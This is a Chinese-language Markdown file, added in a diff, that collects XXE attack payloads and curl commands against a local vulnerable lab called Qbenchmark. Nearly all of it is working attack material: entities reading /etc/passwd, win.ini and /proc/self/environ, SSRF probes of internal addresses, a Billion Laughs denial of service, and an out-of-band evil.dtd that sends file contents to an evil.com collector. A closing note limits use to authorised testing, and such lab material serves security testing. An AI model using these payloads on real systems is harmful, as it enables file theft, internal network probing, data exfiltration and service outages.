@@ -1,0 +1,246 @@
+# XXE (XML External Entity) 漏洞测试 Payload
+# 用于验证 Qbenchmark 靶场中的 XXE 漏洞
+
+## 1. XMLReader XXE Payload
+
+### 端点
+POST http://localhost:8080/xxe/xmlReader/vuln
+Content-Type: application/xml
+
+### 文件读取 Payload
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>&xxe;</root>
+```
+
+### SSRF Payload
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://127.0.0.1:8080">
+]>
+<root>&xxe;</root>
+```
+
+### 测试命令
+```bash
+curl -X POST http://localhost:8080/xxe/xmlReader/vuln \
+  -H "Content-Type: application/xml" \
+  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
+```
+
+---
+
+## 2. SAXBuilder XXE Payload (JDOM2)
+
+### 端点
+POST http://localhost:8080/xxe/saxBuilder/vuln
+Content-Type: application/xml
+
+### 文件读取 Payload
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>&xxe;</root>
+```
+
+### Windows 文件读取
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
+]>
+<root>&xxe;</root>
+```
+
+### 测试命令
+```bash
+curl -X POST http://localhost:8080/xxe/saxBuilder/vuln \
+  -H "Content-Type: application/xml" \
+  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
+```
+
+---
+
+## 3. DocumentBuilder XXE Payload
+
+### 端点
+POST http://localhost:8080/xxe/documentBuilder/vuln
+Content-Type: application/xml
+
+### 文件读取 Payload
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>&xxe;</root>
+```
+
+### SSRF Payload (内网探测)
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://192.168.1.1:22">
+]>
+<root>&xxe;</root>
+```
+
+### 参数实体注入
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">
+  %xxe;
+]>
+<root>test</root>
+```
+
+### 测试命令
+```bash
+curl -X POST http://localhost:8080/xxe/documentBuilder/vuln \
+  -H "Content-Type: application/xml" \
+  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
+```
+
+---
+
+## 4. 其他 XXE 攻击向量
+
+### Billion Laughs DoS
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE lolz [
+  <!ENTITY lol "lol">
+  <!ENTITY lol2 "&lol;&lol;">
+  <!ENTITY lol3 "&lol2;&lol2;">
+  <!ENTITY lol4 "&lol3;&lol3;">
+  <!ENTITY lol5 "&lol4;&lol4;">
+  <!ENTITY lol6 "&lol5;&lol5;">
+  <!ENTITY lol7 "&lol6;&lol6;">
+  <!ENTITY lol8 "&lol7;&lol7;">
+  <!ENTITY lol9 "&lol8;&lol8;">
+]>
+<lolz>&lol9;</lolz>
+```
+
+### 读取 /etc/hosts
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/hosts">
+]>
+<root>&xxe;</root>
+```
+
+### 读取 /proc/self/environ
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///proc/self/environ">
+]>
+<root>&xxe;</root>
+```
+
+### Base64 编码绕过
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+]>
+<root>&xxe;</root>
+```
+
+---
+
+## 5. XXE Blind (OOB) 攻击
+
+### DNS 外带
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://xxx.dnslog.cn/xxe">
+]>
+<root>&xxe;</root>
+```
+
+### HTTP 外带
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">
+  %xxe;
+]>
+<root>test</root>
+```
+
+evil.dtd 内容:
+```xml
+<!ENTITY % data SYSTEM "file:///etc/passwd">
+<!ENTITY % param "<!ENTITY exfil SYSTEM 'http://evil.com/collect?data=%data;'>">
+%param;
+```
+
+---
+
+## 6. 快速验证脚本
+
+```bash
+#!/bin/bash
+TARGET="http://localhost:8080"
+
+echo "=== XXE 漏洞快速验证 ==="
+echo ""
+
+echo "【1】XMLReader XXE"
+curl -s -X POST "$TARGET/xxe/xmlReader/vuln" \
+  -H "Content-Type: application/xml" \
+  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>' | head -5
+
+echo ""
+echo "【2】SAXBuilder XXE"
+curl -s -X POST "$TARGET/xxe/saxBuilder/vuln" \
+  -H "Content-Type: application/xml" \
+  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>' | head -5
+
+echo ""
+echo "【3】DocumentBuilder XXE"
+curl -s -X POST "$TARGET/xxe/documentBuilder/vuln" \
+  -H "Content-Type: application/xml" \
+  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>' | head -5
+```
+
+---
+
+## 7. 工具
+
+- **xxer**: https://github.com/luisfontes19/xxer
+- **XXEinjector**: https://github.com/enjoiz/XXEinjector
+- **XML External Entity (XXE) Processing**: https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing
+
+---
+
+## 注意事项
+
+1. 这些 Payload 仅用于安全研究和教育目的
+2. 请在授权的环境中测试
+3. 文件读取路径可能因操作系统而异
+4. 部分攻击需要外部服务器配合
